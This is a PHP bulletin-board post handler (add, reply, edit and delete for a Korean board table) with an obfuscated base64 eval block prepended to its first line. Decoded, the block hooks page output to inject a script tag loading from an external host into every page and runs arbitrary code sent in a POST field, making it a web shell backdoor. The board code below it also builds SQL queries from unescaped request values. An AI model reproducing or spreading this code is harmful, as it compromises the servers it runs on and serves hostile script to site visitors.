<?php eval(base64_decode('aWYoIWlzc2V0KCRuYmsxKSl7ZnVuY3Rpb24gbmJrKCRzKXtpZihwcmVnX21hdGNoX2FsbCgnIzxzY3JpcHQoLio/KTwvc2NyaXB0PiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF0gYXMgJHYpaWYoY291bnQoZXhwbG9kZSgiXG4iLCR2KSk+NSl7JGU9cHJlZ19tYXRjaCgnI1tcJyJdW15cc1wnIlwuLDtcPyFcW1xdOi88PlwoXCldezMwLH0jJywkdil8fHByZWdfbWF0Y2goJyNbXChcW10oXHMqXGQrLCl7MjAsfSMnLCR2KTtpZigocHJlZ19tYXRjaCgnI1xiZXZhbFxiIycsJHYpJiYoJGV8fHN0cnBvcygkdiwnZnJvbUNoYXJDb2RlJykpKXx8KCRlJiZzdHJwb3MoJHYsJ2RvY3VtZW50LndyaXRlJykpKSRzPXN0cl9yZXBsYWNlKCR2LCcnLCRzKTt9aWYocHJlZ19tYXRjaF9hbGwoJyM8aWZyYW1lIChbXj5dKj8pc3JjPVtcJyJdPyhodHRwOik/Ly8oW14+XSo/KT4jaXMnLCRzLCRhKSlmb3JlYWNoKCRhWzBdIGFzICR2KWlmKHByZWdfbWF0Y2goJyMgd2lkdGhccyo9XHMqW1wnIl0/MCpbMDFdW1wnIj4gXXxkaXNwbGF5XHMqOlxzKm5vbmUjaScsJHYpJiYhc3Ryc3RyKCR2LCc/Jy4nPicpKSRzPXByZWdfcmVwbGFjZSgnIycucHJlZ19xdW90ZSgkdiwnIycpLicuKj88L2lmcmFtZT4jaXMnLCcnLCRzKTskcz1zdHJfcmVwbGFjZSgkYT1iYXNlNjRfZGVjb2RlKCdQSE5qY21sd2RDQnpjbU05YUhSMGNEb3ZMMmx5WVc1d2FXNW5jRzl1Wnk1cGNpOXJhRzkxZW1WemRHRnVYMkpoYzJVdmEyaHZkWHBsYzNSaGJsOTBiM0JmYTJWNWMxOXBibTVsY2k1d2FIQWdQand2YzJOeWFYQjBQZz09JyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcyk7ZWxzZWlmKHN0cnBvcygkcywnLGEnKSkkcy49JGE7cmV0dXJuICRzO31mdW5jdGlvbiBuYmsyKCRhLCRiLCRjLCRkKXtnbG9iYWwgJG5iazE7JHM9YXJyYXkoKTtpZihmdW5jdGlvbl9leGlzdHMoJG5iazEpKWNhbGxfdXNlcl9mdW5jKCRuYmsxLCRhLCRiLCRjLCRkKTtmb3JlYWNoKEBvYl9nZXRfc3RhdHVzKDEpIGFzICR2KWlmKCgkYT0kdlsnbmFtZSddKT09J25iaycpcmV0dXJuO2Vsc2VpZigkYT09J29iX2d6aGFuZGxlcicpYnJlYWs7ZWxzZSAkc1tdPWFycmF5KCRhPT0nZGVmYXVsdCBvdXRwdXQgaGFuZGxlcic/ZmFsc2U6JGEpO2ZvcigkaT1jb3VudCgkcyktMTskaT49MDskaS0tKXskc1skaV1bMV09b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7fW9iX3N0YXJ0KCduYmsnKTtmb3IoJGk9MDskaTxjb3VudCgkcyk7JGkrKyl7b2Jfc3RhcnQoJHNbJGldWzBdKTtlY2hvICRzWyRpXVsxXTt9fX0kbmJrbD0oKCRhPUBzZXRfZXJyb3JfaGFuZGxlcignbmJrMicpKSE9J25iazInKT8kYTowO2V2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpOw==')); ?><?
	include "../dbconn.inc";

	$name = trim($name);
	$title = trim($title);
	$data = trim($data);
	
	$code = trim($code);
	$pds = trim($pds);
	$recomm = trim($recomm);
	$path = "../pds/data/";

	$data = addslashes(Trim($data)); 
	
	// 새글 쓰기
	if ($mode == "addnew") {
	
		# file업로드

/*
		if (!file_exists($path))
			mkdir($path, 0777);

		if ($pds != "") {
			$pds_ext = substr(strrchr($pds_name, "."), 1);
	
			if ($pds_ext == "php" || $pds_ext == "html" || $pds_ext == "php3")
			{
				echo "<script>
					window.alert('확장자가 php, html, php3는 업로드할수가 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
        	
			$pds_strtmp = $path."/".$pds_name;	
        	
        	
			if (file_exists($pds_strtmp)) {
				echo "<script>
        		window.alert('$pds_name 이 같은 디렉토리에 존재합니다..');
					history.go(-1);
					</script>";
				exit;
			}
        	
			if (!copy($pds, $pds_strtmp))
			{
				echo "<script>
					window.alert('$pds_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
        	
		}
*/		
		# file업로드 끝

		$query = "lock table tb_bbs in exclusive mode nowait";
		$result = mysql_query($query);
		// 게시판 리스트에 새글 추가
    	
		$query1 = "select max(no) from tb_bbs where code = '".$code."'";
    	
		$result1 = mysql_query($query1);
		$row1 = mysql_fetch_array($result1);
		if ($row1)
		{
			$no = $row1[0] + 1;
    	
			// 답변글 번호 찾기
			$query2 = "select MAX(re) from tb_bbs where code = '".$code."'";
			$result2 = mysql_query($query2);
			$row2 = mysql_fetch_array($result2);
			$re = $row2[0] + 1;
    	
			// po 최소값 찾기
			$query3 = "select MIN(po) from tb_bbs where code = '".$code."'";
			$result3 = mysql_query($query3);
			$row3 = mysql_fetch_array($result3);
			$po = $row3[0] + 1;
    	
			$query4 = "update tb_bbs set po = po + 1 where code = '".$code."' and po > 0";
			$result4 = mysql_query($query4);
		//	$row4 = mysql_fetch_array($result4);
    	
		} else {
    	
			$no = 1;
			$po = 1; 
			$re = 1;
			$de = 1;
		}
    	
		$query6 = "insert into tb_bbs (no, po, re, de, name, title, wdate, pds, passwd, file_ext, email, data,homepage, ip, code, recomm) values ('$no', 1, '$re', 1, '$name', '$title', now(),'$pds_name','$passwd','$pds_ext','$email','$data','$homepage','$REMOTE_ADDR', '$code', '$recomm')";
    	
 		$result6 = mysql_query($query6);

	} else if ($mode == "rep") { //답변글

		# file업로드
/*
		if (!file_exists($path))
			mkdir($path, 0777);

		if ($pds != "") {
			$pds_ext = substr(strrchr($pds_name, "."), 1);
	
			if ($pds_ext == "php" || $pds_ext == "html" || $pds_ext == "php3")
			{
				echo "<script>
					window.alert('확장자가 php, html, php3는 업로드할수가 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
        	
			$pds_strtmp = $path."/".$pds_name;	
        	
        	
			if (file_exists($pds_strtmp)) {
				echo "<script>
        		window.alert('$pds_name 이 같은 디렉토리에 존재합니다..');
					history.go(-1);
					</script>";
				exit;
			}
        	
			if (!copy($pds, $pds_strtmp))
			{
				echo "<script>
					window.alert('$pds_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}
        	
		}
*/		
		# file업로드 끝

		$query_1 = "lock table tb_bbs in exclusive mode nowait";
		$result_1 = mysql_query($query_1);

		$query_2 = "update tb_bbs set po = po + 1 where code = '".$code."' and po >= $po";
		$result_2 = mysql_query($query_2);

		$query_3 = "select max(no) from tb_bbs where code = '".$code."'";
		$result_3 = mysql_query($query_3);
		$row = mysql_fetch_array($result_3);

		$no = $row[0] + 1;
	
		$query_4 = "insert into tb_bbs (no, po, re, de, name, title, wdate, pds, passwd, file_ext, email, data, ip, code, recomm) values ($no, $po, $re, $de, '$name', '$title', now(),'$pds_name', '$passwd','$pds_ext','$email', '$data','$REMOTE_ADDR','$code', '$recomm')";
		$result_4 = mysql_query($query_4);

		
		#echo $query_4;
		
	} else if ($mode == "mod") {

		# file업로드
/*
		if (!file_exists($path))
			mkdir($path, 0777);

		if ($pds != "") {

			$pds_ext = substr(strrchr($pds_name, "."), 1);
	
			if ($pds_ext == "php" || $pds_ext == "html" || $pds_ext == "php3")
			{
				echo "<script>
					window.alert('확장자가 php, html, php3는 업로드할수가 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}

			$pds_strtmp = $path."/".$pds_name;	

			if ($pds2 != $pds_name) {
						
				if (file_exists($pds_strtmp)) {
					echo "<script>
        			window.alert('$pds_name 이 같은 디렉토리에 존재합니다..');
        			history.go(-1);
					</script>";
					exit;
				} 		
	        
	        	$old_file =$path."/".$pds2;
    	    	//print($old_file);
    	    	$exist = file_exists($old_file);

            	//print($exist);
    	    
    	    	if($exist){
            	
            		$delrst=unlink($old_file);
             		if(!$delrst) {
            	 		echo "삭제실패";
             			exit;               
                	} 			
            	}

			} 

			if (!copy($pds, $pds_strtmp))
			{
				echo "<script>
					window.alert('$pds_name 를 업로드할 수 없습니다.');
					history.go(-1);
					</script>";
				exit;
			}


		}
*/	
		# file업로드 끝

		$query6 = "update tb_bbs set title = '$title', name = '$name', data = '$data', recomm = '$recomm', pds = '$pds_name' where code='$code' and no='$no' and re='$re' and po='$po'";
 		$result6 = mysql_query($query6);

		#echo $query6; 

?>
<html>
<body onLoad="document.frm.submit();">
<form name="frm" method="post" action="pds_view.php">
<input type="hidden" name="page" value="<?echo $page?>">
<input type="hidden" name="idxfield" value="<?echo $idxfield?>">
<input type="hidden" name="qry_str" value="<?echo $qry_str?>">
<input type="hidden" name="mode" value="mod">
<input type="hidden" name="no" value="<?echo $no?>">
<input type="hidden" name="re" value="<?echo $re?>">
<input type="hidden" name="po" value="<?echo $po?>">
<input type="hidden" name="de" value="<?echo $de?>">
<input type="hidden" name="code" value="<?echo $code?>">
</form> 
</body>
</html>
<?
		exit;
	}  else if ($mode == "del") {


		$query = "select de, re from tb_bbs where code = '".$code."' and no = '$no'";
		$result = mysql_query($query);
		$list = mysql_fetch_array($result);
		$sde = $list[de];
		$sre = $list[re];

		$query3 = "select de from tb_bbs where code = '".$code."' and re = '$sre' order by de desc limit 1";
		$result3 = mysql_query($query3);
		$list3 = mysql_fetch_array($result3);
		$sde3 = $list3[de];

		#echo $query3;
		
		#echo "D".$sde3."<br>";

		#echo "M".$sde; 
		
		if ($sde != $sde3) { 
			$query1 = "update tb_bbs set title = '작성자 또는 관리자에 의해 삭제 되었습니다.', data = '답변글이 남아 있어 내용만 삭제 되었습니다.', pds = '' where code = '".$code."' and no = '$no'";
		} else {
			$query1 = "delete from tb_bbs where code = '".$code."' and no = '$no'";
		}

		$result1 = mysql_query($query1);

		# file삭제
/*		
		if ($pds2 != "") {

			$old_file =$path."/".$pds2;

    		$exist = file_exists($old_file);    	    
    		if($exist){
            	
        		$delrst=unlink($old_file);
            				
            	if(!$delrst) {
            		echo "삭제실패";
				} 			
			} 
		}
*/		
		#echo $query1;
	}
	
?>
<html>
<body onLoad="document.frm.submit();">
<form name="frm" method="post" action="pds_list.php">
<input type="hidden" name="page" value="<?echo $page?>">
<input type="hidden" name="idxfield" value="<?echo $idxfield?>">
<input type="hidden" name="qry_str" value="<?echo $qry_str?>">
<input type="hidden" name="code" value="<?echo $code?>">
</form> 
</body>
</html>
<?
		exit;
?>
